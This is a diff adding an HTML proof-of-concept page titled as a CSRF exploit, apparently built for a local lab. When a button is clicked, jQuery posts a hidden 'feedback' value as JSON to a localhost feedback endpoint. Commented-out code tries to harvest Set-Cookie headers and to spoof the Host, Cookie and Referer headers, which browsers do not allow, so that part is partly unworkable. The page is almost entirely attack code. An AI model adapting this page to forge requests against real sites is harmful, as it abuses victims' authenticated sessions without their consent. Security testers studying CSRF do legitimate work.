@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Csrf利用</title>
+
+</head>
+<body>
+<form onsubmit="return false" id="form">
+    <input type="hidden" name="feedback" value="235235">
+    <input type="submit" value="submit" id="add">
+</form>
+<script src="js/jquery-3.5.1.min.js"></script>
+<script>
+    $(function(){
+        var url = "http://localhost:8080/csrf/feedback/message";
+        var host = "";
+        var cookies = "";
+        console.log();
+        var indexurl = "";
+        if(url.indexOf("http") != -1){
+            indexurl = url.substring(0,(url.substring(url.indexOf("//")+2)).indexOf("/")+7);
+            host = indexurl.substring(7);
+        }else{
+            indexurl = url.substring(0,(url.substring(url.indexOf("//")+2)).indexOf("/")+8);
+            host = indexurl.substring(8);
+        }
+        console.log(indexurl+"-"+host);
+<!--        $.ajax({-->
+<!--               url : indexurl,-->
+<!--               headers:{"host":host},-->
+<!--               type : "GET",-->
+<!--               success : function(xhr) {-->
+<!--                    cookies = xhr.getResponseHeader('Set-Cookie');-->
+<!--                    if(cookies === ""){-->
+<!--                        console.log("cookies is null");-->
+<!--                    }else{-->
+<!--                        console.log(cookies);-->
+<!--                    }-->
+<!--               }-->
+<!--        });-->
+        $("#add").click(function(){
+            console.log("1");
+            var fields = $('#form').serializeArray();
+            var obj = {}; //声明一个对象
+            $.each(fields, function(index, field) {
+                obj[field.name] = field.value; //通过变量，将属性值，属性一起放到对象中
+            });
+            var data = JSON.stringify(obj);
+            console.log(data);
+            var cookies="";
+            $.ajax({
+               url : url,
+<!--               headers:{"Host":host,"Set-Cookie":cookies,"Referer":indexurl},-->
+               headers:{"ContentType":"text/plain"},
+               data: data,
+               type : "POST",
+               contentType: 'application/json',
+               dataType: 'JSON',
+               success : function(data) {
+                     console.log(data);
+               }
+            });
+        });
+
+    });
+
+    </script>
+</body>
+</html>
